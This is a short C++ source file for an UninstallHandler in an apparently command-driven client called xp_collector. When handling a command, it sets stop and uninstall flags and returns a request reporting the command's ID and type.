#include "UninstallHandler.h"

#include "Client.h"
#include "Products/BasicProduct.h"
#include "Protocol/ReturnProductRequest.h"

xp_collector::UninstallHandler::UninstallHandler(const std::string& client_id)
	: ICommandHandler(client_id)
{
}

std::unique_ptr<xp_collector::IRequest> xp_collector::UninstallHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	g_is_running = false;
	g_is_uninstalled = true;
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<BasicProduct>(command->get_command_id(), command->get_command_type())
	);
}
